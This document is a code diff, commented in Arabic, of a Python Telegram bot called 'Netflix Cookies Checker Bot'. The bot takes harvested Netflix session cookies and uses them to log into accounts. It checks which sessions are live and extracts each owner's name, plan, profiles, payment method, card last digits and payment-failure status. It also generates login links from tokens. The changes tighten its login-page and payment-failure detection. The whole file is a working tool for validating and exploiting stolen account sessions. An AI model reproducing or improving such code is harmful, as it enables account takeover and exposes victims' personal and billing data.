@@ -1,4 +1,4 @@
-# NF.py - Netflix Cookies Checker Bot (Final v3 - GraphQL Payment Detection)
+# NF.py - Netflix Cookies Checker Bot (Final v4 - Fixed GraphQL)
 import os
 import re
 import json
@@ -230,7 +230,7 @@ def create_mobile_link(token):
         return None
     return f"https://netflix.com/unsupported?nftoken={token}"
 
-# ======================== دوال الفحص الأساسية ========================
+# ======================== دوال مساعدة ========================
 def decode_value(value):
     if value is None:
         return None
@@ -241,11 +241,9 @@ def decode_value(value):
     return cleaned or None
 
 def decode_cookie_value(value):
-    """فك URL encoding من قيمة الكوكي"""
     if not value:
         return value
     try:
-        # لو فيه % نعمل decode
         if '%' in value:
             return urllib.parse.unquote(value)
         return value
@@ -367,58 +365,68 @@ def format_membership_status(status):
     else:
         return status.title()
 
-# ✅ كشف صفحة تسجيل الدخول
+# ======================== كشف صفحة login ========================
 def is_login_page(html_content):
+    """بيكتشف لو الصفحة دي صفحة تسجيل دخول - بفحص دقيق"""
     if not html_content:
         return True
     
     html_lower = html_content.lower()
-    first_chunk = html_lower[:5000]
+    first_chunk = html_lower[:3000]
     
-    has_account_signs = (
-        'your account' in first_chunk or
-        'account details' in first_chunk or
-        'membership details' in first_chunk or
-        'manage membership' in first_chunk or
-        'logout' in html_lower or
-        'sign out' in html_lower or
-        'manageprofiles' in html_lower or
-        'account-overview' in html_lower or
-        'data-uia="account' in html_lower
-    )
+    # ✅ علامات إيجابية على حساب حقيقي
+    account_signs = [
+        'your account',
+        'account details',
+        'membership details',
+        'manage membership',
+        'logout',
+        'sign out',
+        'manageprofiles',
+        'account-overview',
+        'data-uia="account',
+        '"accountmenu"',
+        'membershipstatus',
+        'membership-status',
+    ]
     
-    if has_account_signs:
+    has_account = any(sign in html_lower for sign in account_signs)
+    
+    if has_account:
         return False
     
-    has_login_signs = (
-        'netflix - sign in' in html_lower[:500] or
-        'signin-form' in html_lower or
-        'login-form' in html_lower or
-        'id="signin"' in html_lower or
-        'name="password"' in first_chunk
-    )
+    # ✅ علامات صفحة login فقط
+    login_signs = [
+        '<title>netflix - sign in' in first_chunk,
+        'signin-form' in html_lower,
+        'login-form' in html_lower,
+        'id="signin"' in html_lower,
+        'name="password"' in first_chunk,
+    ]
     
-    if has_login_signs and not has_account_signs:
+    has_login = any(login_signs)
+    
+    if has_login and not has_account:
         return True
     
     return False
 
-# ✅ كشف payment failed من HTML
+# ======================== كشف payment failed من HTML ========================
 def check_payment_failed_html(html_content):
+    """بيدور على علامات payment failed في HTML - بس العلامات الأكيدة"""
     if not html_content:
         return False
     
     html_lower = html_content.lower()
     
+    # ✅ نص كامل + أكيد
     signs = [
         'update your payment information to continue',
         'we were unable to process your last payment',
         'unable to process your last payment',
         'please update your payment information',
-        'clcsPaymentFailureBannerView'.lower(),
-        'payment_failure_interstitial',
-        'payment_failure',
-        'update payment method',
+        'clcspaymentfailurebannerview',  # lowercase
+        'payment failure interstitial',   # مع مسافات
     ]
     
     for sign in signs:
@@ -427,9 +435,9 @@ def check_payment_failed_html(html_content):
     
     return False
 
-# ✅ كشف payment failed عبر GraphQL - الطريقة الجديدة والأقوى
+# ======================== كشف payment failed من GraphQL ========================
 async def check_payment_via_graphql(session):
-    """بيفحص payment status عبر GraphQL - الطريقة اللي Netflix بيستخدمها فعلاً"""
+    """بيفحص payment status عبر GraphQL - بعلامات أكيدة فقط"""
     graphql_url = "https://www.netflix.com/graphql"
     
     headers = {
@@ -440,7 +448,6 @@ async def check_payment_via_graphql(session):
         "referer": "https://www.netflix.com/account",
         "x-netflix.context.operation-name": "CLCSInterstitialAccountPages",
         "x-netflix.request.originating.url": "https://www.netflix.com/account",
-        "x-netflix.request.attempt": "1",
     }
     
     body = {
@@ -463,18 +470,15 @@ async def check_payment_via_graphql(session):
             if resp.status == 200:
                 response_text = await resp.text()
                 
-                # ✅ علامات payment failed
+                # ✅ علامة أكيدة 100%
                 if "clcsPaymentFailureBannerView" in response_text:
                     return True
-                if "payment_failure_interstitial" in response_text:
+                
+                # ✅ نص كامل (مش مجرد payment_failure)
+                if '"value":"Update your payment information to continue."' in response_text:
                     return True
-                if "PAYMENT_FAILURE_INTERSTITIAL" in response_text:
-                    return True
-                if "Update your payment information to continue" in response_text:
-                    return True
-                if "unable to process your last payment" in response_text:
-                    return True
-                if "payment_failure" in response_text.lower():
+                
+                if '"value":"We were unable to process your last payment' in response_text:
                     return True
     except Exception as e:
         print(f"[GraphQL Error] {e}")
@@ -494,8 +498,6 @@ def extract_all_cookies_from_file(content):
     for match in all_matches:
         cookies = {}
         nf_value = match.group(1).strip('"')
-        
-        # ✅ فك URL encoding
         nf_value = decode_cookie_value(nf_value)
 
         if any(acc['cookies'].get('NetflixId') == nf_value for acc in accounts):
@@ -562,63 +564,43 @@ def extract_all_cookies_from_file(content):
 
     return accounts
 
-# ======================== دوال استخراج طريقة الدفع ========================
+# ======================== استخراج طريقة الدفع ========================
 def extract_payment_method(html_content):
     payment_methods = []
-
-    masked_card_match = re.search(r'[*•]{2,}\s*(\d{4})\b', html_content)
+    
+    # 1. masked card مع تأكيد سياق
+    masked_card_match = re.search(r'(?:payment|card|billing)[^<]{0,200}[*•]{2,}\s*(\d{4})', html_content, re.IGNORECASE)
     if masked_card_match:
         return f"Card ending in {masked_card_match.group(1)}"
-
+    
+    # 2. "Card ending in 1234"
+    ending_match = re.search(r'ending in[^\d]{0,10}(\d{4})', html_content, re.IGNORECASE)
+    if ending_match:
+        return f"Card ending in {ending_match.group(1)}"
+    
+    # 3. paymentMethod في JSON
     payment_match = re.search(r'"paymentMethod"\s*:\s*"([^"]+)"', html_content)
     if payment_match:
         method = decode_value(payment_match.group(1))
         if method and method not in payment_methods:
             payment_methods.append(method)
-
-    payment_match = re.search(r'"paymentMethodType"\s*:\s*"([^"]+)"', html_content)
-    if payment_match:
-        method = decode_value(payment_match.group(1))
-        if method and method not in payment_methods:
-            payment_methods.append(method)
-
-    billing_patterns = [
-        r'<div[^>]*data-uia="payment-method"[^>]*>([^<]+)</div>',
-        r'<span[^>]*data-uia="payment-method-label"[^>]*>([^<]+)</span>',
-        r'ending in[^\d]*(\d{4})',
-        r'\b(Visa|Mastercard|American Express|Amex|Discover|PayPal|Gift Card|OVO)\b[^<]*',
-    ]
-
-    for pattern in billing_patterns:
-        match = re.search(pattern, html_content, re.IGNORECASE)
-        if match:
-            if len(match.groups()) > 0 and match.group(1):
-                method = decode_value(match.group(1))
-            else:
-                method = decode_value(match.group(0))
-
-            if method and method not in payment_methods and len(method) > 2 and len(method) < 100:
-                if 'ending in' in method.lower() or method.isdigit():
-                    card_match = re.search(r'ending in[^\d]*(\d{4})', method, re.IGNORECASE)
-                    if card_match:
-                        method = f"Card ending in {card_match.group(1)}"
-                payment_methods.append(method[:50])
-
+    
+    # 4. أسماء معروفة
     known_methods = ['PayPal', 'Visa', 'Mastercard', 'American Express', 'Amex', 'Discover',
                      'Gift Card', 'iTunes', 'Google Play', 'Bank Transfer', 'OVO']
-
+    
     for method in known_methods:
         if re.search(r'\b' + re.escape(method) + r'\b', html_content, re.IGNORECASE):
             if method not in payment_methods:
                 payment_methods.append(method)
-
+    
     for method in payment_methods:
         if method and len(method) > 1:
             return method
-
+    
     return None
 
-# ======================== دوال استخراج البروفايلات ========================
+# ======================== استخراج البروفايلات ========================
 def clean_profile_name(name):
     if not name:
         return None
@@ -837,6 +819,7 @@ async def extract_profiles_from_page(session, url):
 
     return page_profiles, html_content
 
+# ======================== الدالة الرئيسية للفحص ========================
 async def get_account_info(cookies):
     if not cookies or "NetflixId" not in cookies:
         return None, "Missing NetflixId"
@@ -864,10 +847,10 @@ async def get_account_info(cookies):
             cookies=session_cookies,
             headers=headers
         ) as session:
-            # ============ 1. صفحة /account (بدل YourAccount) ============
+            # ============ 1. صفحة /account ============
             async with session.get("https://www.netflix.com/account", allow_redirects=True) as resp:
                 if resp.status != 200:
-                    # نجرب YourAccount كـ fallback
+                    # fallback على YourAccount
                     async with session.get("https://www.netflix.com/YourAccount", allow_redirects=True) as resp2:
                         if resp2.status != 200:
                             return None, f"HTTP {resp2.status}"
@@ -883,6 +866,7 @@ async def get_account_info(cookies):
                 # payment_failed من HTML
                 payment_failed = check_payment_failed_html(html_content)
 
+                # استخراج البيانات
                 name_match = re.search(r'"firstName"\s*:\s*"([^"]+)"', html_content)
                 if name_match:
                     info["name"] = decode_value(name_match.group(1))
@@ -969,10 +953,13 @@ async def get_account_info(cookies):
                 else:
                     info["status"] = "Active"
 
-            # ============ 2. GraphQL check (الطريقة الأقوى) ============
-            graphql_payment_failed = await check_payment_via_graphql(session)
-            if graphql_payment_failed:
-                payment_failed = True
+            # ============ 2. GraphQL check ============
+            try:
+                graphql_payment_failed = await check_payment_via_graphql(session)
+                if graphql_payment_failed:
+                    payment_failed = True
+            except:
+                pass
 
             # ============ 3. صفحة البروفايلات ============
             profiles, profiles_html = await extract_profiles_from_page(session, "https://www.netflix.com/ManageProfiles")
@@ -1018,6 +1005,7 @@ async def get_account_info(cookies):
     except Exception as e:
         return None, str(e)[:50]
 
+# ======================== تحديد الخطة ========================
 def determine_plan(info):
     if not info:
         return "invalid", "Invalid", False
@@ -1076,7 +1064,7 @@ def determine_plan(info):
 
     return "unknown", "Unknown", True
 
-# ======================== دالة تنسيق النتيجة للشات ========================
+# ======================== تنسيق النتيجة للشات ========================
 def format_account_details_for_chat(info, pc_link=None, mobile_link=None):
     if not info:
         return None, None
@@ -1181,7 +1169,7 @@ def format_account_details_for_chat(info, pc_link=None, mobile_link=None):
 
     return text, keyboard
 
-# ======================== دالة تنسيق النتيجة للملفات ========================
+# ======================== تنسيق النتيجة للملفات ========================
 def format_account_details_for_file(info, pc_link=None):
     if not info:
         return None
@@ -1784,11 +1772,10 @@ def main():
 
     print("=" * 50)
     print("✅ Netflix Checker Bot is running...")
-    print("✅ GraphQL Payment Detection ACTIVE")
+    print("✅ GraphQL Payment Detection (STRICT)")
     print("✅ URL-decoding for cookies")
     print("✅ Async mode - /cancel INSTANT")
     print("✅ Profile extraction (15 methods)")
-    print("✅ Language & UI filter")
     print("=" * 50)
 
     app.run_polling(allowed_updates=Update.ALL_TYPES)
